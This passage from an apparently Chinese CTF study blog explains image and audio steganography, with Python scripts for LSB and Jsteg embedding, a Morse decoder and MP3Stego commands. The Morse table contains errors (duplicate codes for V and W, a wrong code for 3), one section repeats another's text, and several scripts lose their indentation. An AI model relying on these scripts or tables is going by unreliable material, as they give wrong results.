class="line">data=self.im.getpixel((x,y))</span><br><span class="line">return data%2</span><br><span class="line"> </span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">lsb=LSB()</span><br><span class="line"># 写</span><br><span class="line">lsb.load_bmp(&#x27;test.bmp&#x27;)</span><br><span class="line">info1=[0,1,0,1,1,0,1,0]</span><br><span class="line">lsb.write(info1)</span><br><span class="line">lsb.save(&#x27;lsb.bmp&#x27;)</span><br><span class="line"># 读</span><br><span class="line">lsb.load_bmp(&#x27;lsb.bmp&#x27;)</span><br><span class="line">info2=lsb.read()</span><br><span class="line">print (info2)</span><br></pre></td></tr></table></figure><p>识别方法</p><ul><li>stegsolve，调通道</li><li>zsteg，神一样的工具</li></ul><p>提取脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">im = Image.open(&quot;extracted.bmp&quot;)</span><br><span class="line">pix = im.load()</span><br><span class="line">width, height = im.size</span><br><span class="line"></span><br><span class="line">extracted_bits = []</span><br><span class="line">for y in range(height):</span><br><span class="line">    for x in range(width):</span><br><span class="line">        r, g, b = pix[(x,y)]</span><br><span class="line">        extracted_bits.append(r &amp; 1)</span><br><span class="line">        extracted_bits.append(g &amp; 1)</span><br><span class="line">        extracted_bits.append(b &amp; 1)</span><br><span class="line"></span><br><span class="line">extracted_byte_bits = [extracted_bits[i:i+8] for i in range(0, len(extracted_bits), 8)]</span><br><span class="line">with open(&quot;extracted2.bmp&quot;, &quot;wb&quot;) as out:</span><br><span class="line">    for byte_bits in extracted_byte_bits:</span><br><span class="line">                byte_str = &#x27;&#x27;.join(str(x) for x in byte_bits)</span><br><span class="line">        byte = chr(int(byte_str, 2))</span><br><span class="line">        out.write(byte)</span><br></pre></td></tr></table></figure><h2 id="4、基于DCT域的JPG图片隐写"><a href="#4、基于DCT域的JPG图片隐写" class="headerlink" title="4、基于DCT域的JPG图片隐写"></a>4、基于DCT域的JPG图片隐写</h2><p>JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像</p><ul><li><p>通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数</p></li><li><p>使用近似估算法降低其冗余度</p></li><li><p>有损压缩（Loss Compression）技术</p></li><li><p>常见的隐写方法有JSteg、JPHide、Outguess、F5</p></li></ul><p>Jsteg隐写</p><ul><li><p>将秘密信息嵌入在量化后的DCT系数的LSB上</p></li><li><p>原始值为-1,0，+1的DCT系数除外</p></li><li><p>量化后的DCT系数中有负数</p></li></ul><p>实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line"> </span><br><span class="line">def dct(m):</span><br><span class="line">    m = np.float32(m)/255.0</span><br><span class="line">    return cv2.dct(m)*255</span><br><span class="line"></span><br><span class="line">class Jsteg:</span><br><span class="line">def __init__(self):</span><br><span class="line">self.sequence_after_dct=None</span><br><span class="line"> </span><br><span class="line">def set_sequence_after_dct(self,sequence_after_dct):</span><br><span class="line">self.sequence_after_dct=sequence_after_dct</span><br><span class="line">self.available_info_len=len([i for i in self.sequence_after_dct if i not in (-1,1,0)]) # 不是绝对可靠的</span><br><span class="line">print (&quot;Load&gt;&gt; 可嵌入&quot;,self.available_info_len,&#x27;bits&#x27;)</span><br><span class="line"></span><br><span class="line">def get_sequence_after_dct(self):</span><br><span class="line">return self.sequence_after_dct</span><br><span class="line"> </span><br><span class="line">def write(self,info):</span><br><span class="line">&quot;&quot;&quot;先嵌入信息的长度，然后嵌入信息&quot;&quot;&quot;</span><br><span class="line">info=self._set_info_len(info)</span><br><span class="line">info_len=len(info)</span><br><span class="line">info_index=0</span><br><span class="line">im_index=0</span><br><span class="line">while True:</span><br><span class="line">if info_index&gt;=info_len:</span><br><span class="line">break</span><br><span class="line">data=info[info_index]</span><br><span class="line">if self._write(im_index,data):</span><br><span class="line">info_index+=1</span><br><span class="line">im_index+=1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def read(self):</span><br><span class="line">&quot;&quot;&quot;先读出信息的长度，然后读出信息&quot;&quot;&quot;</span><br><span class="line">_len,sequence_index=self._get_info_len()</span><br><span class="line">info=[]</span><br><span class="line">info_index=0</span><br><span class="line"> </span><br><span class="line">while True:</span><br><span class="line">if info_index&gt;=_len:</span><br><span class="line">break</span><br><span class="line">data=self._read(sequence_index)</span><br><span class="line">if data!=None:</span><br><span class="line">info.append(data)</span><br><span class="line">info_index+=1</span><br><span class="line">sequence_index+=1</span><br><span class="line"> </span><br><span class="line">return info</span><br><span class="line"> </span><br><span class="line">#===============================================================#</span><br><span class="line"> </span><br><span class="line">def _set_info_len(self,info):</span><br><span class="line">l=int(math.log(self.available_info_len,2))+1</span><br><span class="line">info_len=[0]*l</span><br><span class="line">_len=len(info)</span><br><span class="line">info_len[-len(bin(_len))+2:]=[int(i) for i in bin(_len)[2:]]</span><br><span class="line">return info_len+info</span><br><span class="line"> </span><br><span class="line">def _get_info_len(self):</span><br><span class="line">l=int(math.log(self.available_info_len,2))+1</span><br><span class="line">len_list=[]</span><br><span class="line">_l_index=0</span><br><span class="line">_seq_index=0</span><br><span class="line">while True:</span><br><span class="line">if _l_index&gt;=l:</span><br><span class="line">break</span><br><span class="line">_d=self._read(_seq_index)</span><br><span class="line">if _d!=None:</span><br><span class="line">len_list.append(str(_d))</span><br><span class="line">_l_index+=1</span><br><span class="line">_seq_index+=1</span><br><span class="line">_len=&#x27;&#x27;.join(len_list)</span><br><span class="line">_len=int(_len,2)</span><br><span class="line">return _len,_seq_index</span><br><span class="line"> </span><br><span class="line">def _write(self,index,data):</span><br><span class="line">origin=self.sequence_after_dct[index]</span><br><span class="line">if origin in (-1,1,0):</span><br><span class="line">return False</span><br><span class="line"> </span><br><span class="line">lower_bit=origin%2</span><br><span class="line">if lower_bit==data:</span><br><span class="line">pass</span><br><span class="line">elif origin&gt;0:</span><br><span class="line">if (lower_bit,data) == (0,1):</span><br><span class="line">self.sequence_after_dct[index]=origin+1</span><br><span class="line">elif (lower_bit,data) == (1,0):</span><br><span class="line">self.sequence_after_dct[index]=origin-1</span><br><span class="line">elif origin&lt;0:</span><br><span class="line">if (lower_bit,data) == (0,1):</span><br><span class="line">self.sequence_after_dct[index]=origin-1</span><br><span class="line">elif (lower_bit,data) == (1,0):</span><br><span class="line">self.sequence_after_dct[index]=origin+1</span><br><span class="line"> </span><br><span class="line">return True</span><br><span class="line"> </span><br><span class="line">def _read(self,index):</span><br><span class="line">if self.sequence_after_dct[index] not in (-1,1,0):</span><br><span class="line">return self.sequence_after_dct[index]%2</span><br><span class="line">else:</span><br><span class="line">return None</span><br><span class="line"> </span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">jsteg=Jsteg()</span><br><span class="line"># 写</span><br><span class="line">sequence_after_dct=[-1,0,1]*100+[i for i in range(-7,500)]</span><br><span class="line">jsteg.set_sequence_after_dct(sequence_after_dct)</span><br><span class="line">info1=[0,1,0,1,1,0,1,0]</span><br><span class="line">jsteg.write(info1)</span><br><span class="line">sequence_after_dct2=jsteg.get_sequence_after_dct()</span><br><span class="line"># 读</span><br><span class="line">jsteg.set_sequence_after_dct(sequence_after_dct2)</span><br><span class="line">info2=jsteg.read()</span><br><span class="line">print (info2)</span><br></pre></td></tr></table></figure><p>Outgusee算法</p><ul><li><p>针对Jsteg算法的缺陷提出的一种方法</p></li><li><p>嵌入过程不修改ECT系数值为0，1的DCT系数</p></li><li><p>利用为随机数发生器产生间隔以决定下一个要嵌入的DCT系数的位置</p></li><li><p>纠正过程消除对效应的出现</p></li></ul><p>识别方法</p><ul><li><p>Stegdetect：检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息</p></li><li><p>JPHS：针对JPHide</p></li><li><p>Outguess：针对OutGuess</p></li></ul><h2 id="5、数字水印隐写"><a href="#5、数字水印隐写" class="headerlink" title="5、数字水印隐写"></a>5、数字水印隐写</h2><p>数字水印（digital watermark）</p><ul><li><p>在数字化的数据内容中嵌入不明显的记号</p></li><li><p>被嵌入的记号通常是不可见或不可察的</p></li><li><p>可以通过计算操作检测或者提取</p></li></ul><p>盲水印</p><ul><li><p>对图像进行傅里叶变换，起始是一个二维离散傅里叶变换，图像的频率是指图像灰度变换的强烈程度</p></li><li><p>将二维图像由空间域变为频域后，图像上的每个点的值都变成了复数，也就是所谓的复频域，通过复数的实部和虚部，可以计算出幅值和相位，计算幅值即对复数取模值，将取模值后的矩阵显示出来，即为其频谱图</p></li><li><p>对模值再取对数，在在0~255的范围内进行归一化，这样才能够准确的反映到图像上，发现数据之间的差别，区分高频和低频分量</p></li></ul><p>识别方法：</p><ul><li><a href="/image/media/2022/misc/BlindWaterMark.zip">本地bwn</a></li><li><a href="https://github.com/chishaxie/BlindWaterMark">github链接bwm</a></li></ul><h2 id="6、图片容差隐写"><a href="#6、图片容差隐写" class="headerlink" title="6、图片容差隐写"></a>6、图片容差隐写</h2><p>容差</p><ul><li><p>在选取颜色时所设置的选取范围</p></li><li><p>容差越大，选取的范围也越大</p></li><li><p>其数值是在0-255之间</p></li></ul><p>容差比较的隐写</p><ul><li><p>若是有两张图片，则对两张图片的每一个像素点进行对比，设置一个容差的阈值α，超出这个阈值的像素点RGB值设置为(255,255,255),若是没超过阈值，则设置该像素点的RGB值为(0,0,0)。因此，通过调整不同的α值，可以使对比生成的图片呈现不同的画面。比如两张图完全一样，设置阈值α为任何值，最后得到的对比图都只会是全黑。若两张图每一个像素点都不同，阈值α设置为1，则对比图将是全白。如果将隐藏信息附加到某些像素点上，这时调整阈值α即可看到隐藏信息。</p></li><li><p>如果是一张图片，则根据每一像素点周围像素的值进行判断，同样设置一个阈值，若当前像素点超过周围像素点的均值，或者其它的某种规则，则将该像素点RGB值置为(255,255,255)，反之则不进行处理，或者设置为全0.这样也可以获得隐藏的信息。</p></li></ul><p>识别方法</p><ul><li>beyond compare比较图片</li></ul><h2 id="7、打乱进制"><a href="#7、打乱进制" class="headerlink" title="7、打乱进制"></a>7、打乱进制</h2><p>比如把整个二进制都逆序<br>得到一堆乱码</p><p>识别方法</p><ul><li>winhex，看文件头尾是不是互换且逆序</li></ul><p>反序脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">f = open(&#x27;1&#x27;,&quot;rb&quot;)#二进制形式打开</span><br><span class="line">f = f.read()[::-1]</span><br><span class="line">for i in f:</span><br><span class="line">    ans = str(hex(i))[2:][::-1]</span><br><span class="line">    if len(ans) == 1:</span><br><span class="line">        ans = ans + &#x27;0&#x27;</span><br><span class="line">    print(ans,end=&#x27;&#x27;)</span><br><span class="line">#实现反序输出一个文件</span><br></pre></td></tr></table></figure><p>翻转脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f1=open(&#x27;task_flag.jpg&#x27;,&#x27;rb&#x27;).read()</span><br><span class="line">f1_len=len(f1)</span><br><span class="line">f2=open(&#x27;tt.jpg&#x27;, &#x27;ab&#x27;)</span><br><span class="line">i=0</span><br><span class="line">while i&lt;f1_len:</span><br><span class="line">    f2.write(f1[i:i+4][::-1])</span><br><span class="line">    i=i+4</span><br><span class="line">f2.close()</span><br><span class="line">#实现镜像翻转图片</span><br></pre></td></tr></table></figure><h2 id="8、GIF的组合"><a href="#8、GIF的组合" class="headerlink" title="8、GIF的组合"></a>8、GIF的组合</h2><p>gif每帧是某个图的一部分<br>提取每帧再拼接</p><p>工具</p><ul><li>stegsolve</li></ul><h2 id="9、YCrCb隐写"><a href="#9、YCrCb隐写" class="headerlink" title="9、YCrCb隐写"></a>9、YCrCb隐写</h2><p>gif每帧是某个图的一部分<br>提取每帧再拼接</p><p>工具</p><ul><li>stegsolve</li></ul><p>颜色翻转代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from cv2 import cv2 as cv</span><br><span class="line">#需要打开图片的路径，可以是绝对路径或者相对路径，路径中不能出现中文</span><br><span class="line">#读取的彩色图片，是按照 GBR 的形式,数据格式在 0~255</span><br><span class="line">#根据提示不止RGB,opencv中有多种色彩空间，包括 RGB、HSI、HSL、HSV、HSB、YCrCb、CIE XYZ、CIE Lab8种</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">使用函数cv2.imread(filepath,flags)读入一副图片</span><br><span class="line">        filepath：要读入图片的完整路径</span><br><span class="line">        flags：读入图片的标志 </span><br><span class="line">        cv2.IMREAD_COLOR：默认参数，读入一副彩色图片，忽略alpha通道</span><br><span class="line">        cv2.IMREAD_GRAYSCALE：读入灰度图片</span><br><span class="line">        cv2.IMREAD_UNCHANGED：顾名思义，读入完整图片，包括alpha通道</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">imag=cv.imread(&#x27;G:/Desktop/211119619784cbdb9fb.png&#x27;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">用法： cv2.cvtColor(src, code[, dst[, dstCn]])</span><br><span class="line">参数：</span><br><span class="line">src:它是要更改其色彩空间的图像。</span><br><span class="line">code:它是色彩空间转换代码。</span><br><span class="line">dst:它是与src图像大小和深度相同的输出图像。它是一个可选参数。</span><br><span class="line">dstCn:它是目标图像中的频道数。如果参数为0，则通道数自动从src和代码得出。它是一个可选参数。</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">src=cv.cvtColor(imag,cv.COLOR_BGR2YCrCb)</span><br><span class="line">Y,Cr,Cb=cv.split(src)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">使用函数cv2.imwrite(file，img，num)保存一个图像。</span><br><span class="line">第一个参数是要保存的文件名，第二个参数是要保存的图像。</span><br><span class="line">可选的第三个参数，它针对特定的格式：对于JPEG，其表示的是图像的质量，</span><br><span class="line">用0 - 100的整数表示，默认95;对于png ,第三个参数表示的是压缩级别，默认为3</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">cv.imwrite(&#x27;G:/Desktop/Y.png&#x27;,(Y%2)*255)</span><br><span class="line">cv.imwrite(&#x27;G:/Desktop/Cr.png&#x27;,(Cr%2)*255)</span><br><span class="line">cv.imwrite(&#x27;G:/Desktop/Cb.png&#x27;,(Cb%2)*255)</span><br></pre></td></tr></table></figure><h1 id="三、音频隐写"><a href="#三、音频隐写" class="headerlink" title="三、音频隐写"></a>三、音频隐写</h1><p>简单提一下</p><ul><li>频谱图藏信息</li><li>高低位二进制</li><li>波形藏摩斯密码</li><li>MP3Stego</li><li>音频中也有LSB</li></ul><h2 id="1、摩斯电码"><a href="#1、摩斯电码" class="headerlink" title="1、摩斯电码"></a>1、摩斯电码</h2><p>考察点</p><ul><li>WAV音频文件隐写术</li><li>Python基础</li><li>密码学</li></ul><p>工具</p><ul><li>Audacity</li></ul><p>莫斯电码解密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">s = input(&quot;input the cipher_text Enclose with quotes:&quot;)</span><br><span class="line">codebook = &#123;</span><br><span class="line">    &#x27;A&#x27;:&quot;.-&quot;,</span><br><span class="line">    &#x27;B&#x27;:&quot;-...&quot;,</span><br><span class="line">    &#x27;C&#x27;:&quot;-.-.&quot;,</span><br><span class="line">    &#x27;D&#x27;:&quot;-..&quot;,</span><br><span class="line">    &#x27;E&#x27;:&quot;.&quot;,</span><br><span class="line">    &#x27;F&#x27;:&quot;..-.&quot;,</span><br><span class="line">    &#x27;G&#x27;:&quot;--.&quot;,</span><br><span class="line">    &#x27;H&#x27;:&quot;....&quot;,</span><br><span class="line">    &#x27;I&#x27;:&quot;..&quot;,</span><br><span class="line">    &#x27;J&#x27;:&quot;.---&quot;,</span><br><span class="line">    &#x27;K&#x27;:&quot;-.-&quot;,</span><br><span class="line">    &#x27;L&#x27;:&quot;.-..&quot;,</span><br><span class="line">    &#x27;M&#x27;:&quot;--&quot;,</span><br><span class="line">    &#x27;N&#x27;:&quot;-.&quot;,</span><br><span class="line">    &#x27;O&#x27;:&quot;---&quot;,</span><br><span class="line">    &#x27;P&#x27;:&quot;.--.&quot;,</span><br><span class="line">    &#x27;Q&#x27;:&quot;--.-&quot;,</span><br><span class="line">    &#x27;R&#x27;:&quot;.-.&quot;,</span><br><span class="line">    &#x27;S&#x27;:&quot;...&quot;,</span><br><span class="line">    &#x27;T&#x27;:&quot;-&quot;,</span><br><span class="line">    &#x27;U&#x27;:&quot;..-&quot;,</span><br><span class="line">    &#x27;V&#x27;:&quot;.--&quot;,</span><br><span class="line">    &#x27;W&#x27;:&quot;.--&quot;,</span><br><span class="line">    &#x27;X&#x27;:&quot;-..-&quot;,</span><br><span class="line">    &#x27;Y&#x27;:&quot;-.--&quot;,</span><br><span class="line">    &#x27;Z&#x27;:&quot;--..&quot;,</span><br><span class="line">    &#x27;1&#x27;:&quot;.----&quot;,</span><br><span class="line">    &#x27;2&#x27;:&quot;..---&quot;,</span><br><span class="line">    &#x27;3&#x27;:&quot;...---&quot;,</span><br><span class="line">    &#x27;4&#x27;:&quot;....-&quot;,</span><br><span class="line">    &#x27;5&#x27;:&quot;.....&quot;,</span><br><span class="line">    &#x27;6&#x27;:&quot;-....&quot;,</span><br><span class="line">    &#x27;7&#x27;:&quot;--...&quot;,</span><br><span class="line">    &#x27;8&#x27;:&quot;---..&quot;,</span><br><span class="line">    &#x27;9&#x27;:&quot;----.&quot;,</span><br><span class="line">    &#x27;0&#x27;:&quot;-----&quot;,</span><br><span class="line">    &#x27;.&#x27;:&quot;.━.━.━&quot;,</span><br><span class="line">    &#x27;?&#x27;:&quot;..--..&quot;,</span><br><span class="line">    &#x27;!&#x27;:&quot;-.-.--&quot;,</span><br><span class="line">    &#x27;(&#x27;:&quot;-.--.&quot;,</span><br><span class="line">    &#x27;@&#x27;:&quot;.--.-.&quot;,</span><br><span class="line">    &#x27;:&#x27;:&quot;---...&quot;,</span><br><span class="line">    &#x27;=&#x27;:&quot;-...-&quot;,</span><br><span class="line">    &#x27;-&#x27;:&quot;-....-&quot;,</span><br><span class="line">    &#x27;)&#x27;:&quot;-.--.-&quot;,</span><br><span class="line">    &#x27;+&#x27;:&quot;.-.-.&quot;,</span><br><span class="line">    &#x27;,&#x27;:&quot;--..--&quot;,</span><br><span class="line">    &#x27;\&#x27;&#x27;:&quot;.----.&quot;,</span><br><span class="line">    &#x27;_&#x27;:&quot;..--.-&quot;,</span><br><span class="line">    &#x27;$&#x27;:&quot;...-..-&quot;,</span><br><span class="line">    &#x27;;&#x27;:&quot;-.-.-.&quot;,</span><br><span class="line">    &#x27;/&#x27;:&quot;-..-.&quot;,</span><br><span class="line">    &#x27;\&quot;&#x27;:&quot;.-..-.&quot;,</span><br><span class="line">&#125;</span><br><span class="line">clear = &quot;&quot;</span><br><span class="line">cipher = &quot;&quot;</span><br><span class="line"></span><br><span class="line">while 1:</span><br><span class="line">    ss = s.split(&quot; &quot;);</span><br><span class="line">    for c in ss:</span><br><span class="line">        for k in codebook.keys():</span><br><span class="line">            if codebook[k] == c:</span><br><span class="line">                cipher+=k</span><br><span class="line">    print(cipher)</span><br><span class="line">    break;</span><br></pre></td></tr></table></figure><p>除了使用本地脚本，还有很多在线网站可以解密</p><h2 id="2、频谱图"><a href="#2、频谱图" class="headerlink" title="2、频谱图"></a>2、频谱图</h2><p>考察点</p><ul><li>WAV 音频文件隐写术</li><li>Audacity 的基操</li></ul><p>工具</p><ul><li>Audacity</li></ul><p>识别方法</p><ul><li>这里使用工具 Audacity 去打开 wav文件。切换到<code>频谱图</code>去观察：</li></ul><p><img src="/image/media/2022/misc/4.png"></p><ul><li>从频谱图可以直接看到 flag：</li></ul><p><img src="/image/media/2022/misc/5.png"></p><h2 id="3、波形图"><a href="#3、波形图" class="headerlink" title="3、波形图"></a>3、波形图</h2><p>考察点</p><ul><li>WAV 音频文件隐写术</li><li>简单密码学</li></ul><p>工具</p><ul><li>Audacity</li></ul><p>识别方法</p><ul><li>用 Audacity 打开文件后，放大波形谱。</li></ul><p><img src="/image/media/2022/misc/6.png"></p><p>以高为 1 低为 0，转换得到 01 字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101</span><br></pre></td></tr></table></figure><p>一共105位，额，不符合8位一个字符，符合7位，于是在每个7位之前加个0，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">01100110,01101100,01100001,01100111,01111011,01010111,00110000</span><br><span class="line">01010111,00101010,01100110,01110101,01101110,01101110,01111001,</span><br><span class="line">01111101</span><br></pre></td></tr></table></figure><p>然后二进制转十进制,然后再转为 ASCII，得到 flag。</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1100110</span><span class="number">102</span></span><br><span class="line"><span class="number">1101100</span><span class="number">108</span></span><br><span class="line"><span class="number">1100001</span><span class="number">97</span></span><br><span class="line"><span class="number">1100111</span><span class="number">103</span></span><br><span class="line"><span class="number">1111011</span><span class="number">123</span></span><br><span class="line"><span class="number">1010111</span><span class="number">87</span></span><br><span class="line"><span class="number">0110000</span><span class="number">48</span></span><br><span class="line"><span class="number">1010111</span><span class="number">87</span></span><br><span class="line"><span class="number">0101010</span><span class="number">42</span></span><br><span class="line"><span class="number">1100110</span><span class="number">102</span></span><br><span class="line"><span class="number">1110101</span><span class="number">117</span></span><br><span class="line"><span class="number">1101110</span><span class="number">110</span></span><br><span class="line"><span class="number">1101110</span><span class="number">110</span></span><br><span class="line"><span class="number">1111001</span><span class="number">121</span></span><br><span class="line"><span class="number">1111101</span><span class="number">125</span></span><br><span class="line"></span><br><span class="line">flag&#123;W0W*funny&#125;</span><br></pre></td></tr></table></figure><p>感觉这题的难点不是从频谱中读取二进制数据。</p><p>个人觉得从读出的二进制数据想到 8 位一组补上 0 ，这一步还是比较难的，得保持数据的敏感性才可以</p><h2 id="4、MP3-隐写"><a href="#4、MP3-隐写" class="headerlink" title="4、MP3 隐写"></a>4、MP3 隐写</h2><p>概览</p><p>ISCC-2016：Music Never Sleep</p><p>考察点</p><ul><li>mp3 音频文件隐写</li></ul><p>工具</p><ul><li><a href="https://www.petitcolas.net/steganography/mp3stego/">MP3stego官网</a></li><li><a href="/image/media/2022/misc/MP3Stego_1_1_19.zip">MP3stego本地链接版本</a></li></ul><p>在压缩过程中，<code>MP3Stego</code> 会将信息隐藏在 MP3 文件中。数据首先被压缩、加密，然后隐藏在 MP3 比特流中。</p><p>基本介绍和用法如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3</span><br><span class="line">decode -X -P pass svega_stego.mp3</span><br></pre></td></tr></table></figure><p>听音频无异常猜测使用隐写软件隐藏数据，搜索 mp3 里面的关键字符串:</p><p><img src="/image/media/2022/misc/1.jpg"></p><p>得到密码后使用 Mp3Stego解密:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode.exe -X ISCC2016.mp3 -P bfsiscc2016</span><br></pre></td></tr></table></figure><p>得到文件 iscc2016.mp3.txt，其内容是：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 